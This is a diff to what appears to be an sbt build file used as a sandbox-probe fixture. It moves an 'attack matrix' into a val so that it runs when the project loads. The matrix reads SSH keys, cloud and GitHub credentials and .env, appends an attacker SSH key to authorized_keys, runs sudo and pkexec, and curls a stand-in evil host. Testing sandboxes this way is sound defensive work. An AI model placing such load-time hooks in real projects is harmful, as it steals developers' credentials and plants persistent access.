@@ -93,13 +93,21 @@ def tryCurl(id: String, url: String): Unit = {
   }
 }
 
-tryRead("ssh-read",      s"$HOME/.ssh/id_ed25519")
-tryRead("aws-read",      s"$HOME/.aws/credentials")
-tryRead("gcloud-read",   s"$HOME/.config/gcloud/credentials.db")
-tryRead("gh-token-read", s"$HOME/.config/gh/hosts.yml")
-tryRead("env-read",      "./.env")
-tryAppend("bashrc-write",          s"$HOME/.bashrc",                "\n# pwned\n")
-tryAppend("authorized-keys-write", s"$HOME/.ssh/authorized_keys",   "\nssh-rsa AAAAATTACKER attacker@evil\n")
-tryExec("sudo-exec",   "/usr/bin/sudo",   Seq("-l"))
-tryExec("pkexec-exec", "/usr/bin/pkexec", Seq("--version"))
-tryCurl("curl-evil",   "https://evil.example.invalid/")
+// sbt 1.x's build.sbt DSL requires top-level statements to be settings or
+// definitions; bare side-effect expressions raise "type mismatch; found:
+// Unit". Bind the attack matrix to a private val so it's a valid
+// definition. The val is evaluated eagerly when sbt loads the project,
+// which is exactly when we want the probes to fire (before any task runs).
+@SuppressWarnings(Array("UnusedDeclaration"))
+val _attackMatrix: Unit = {
+  tryRead("ssh-read",      s"$HOME/.ssh/id_ed25519")
+  tryRead("aws-read",      s"$HOME/.aws/credentials")
+  tryRead("gcloud-read",   s"$HOME/.config/gcloud/credentials.db")
+  tryRead("gh-token-read", s"$HOME/.config/gh/hosts.yml")
+  tryRead("env-read",      "./.env")
+  tryAppend("bashrc-write",          s"$HOME/.bashrc",                "\n# pwned\n")
+  tryAppend("authorized-keys-write", s"$HOME/.ssh/authorized_keys",   "\nssh-rsa AAAAATTACKER attacker@evil\n")
+  tryExec("sudo-exec",   "/usr/bin/sudo",   Seq("-l"))
+  tryExec("pkexec-exec", "/usr/bin/pkexec", Seq("--version"))
+  tryCurl("curl-evil",   "https://evil.example.invalid/")
+}
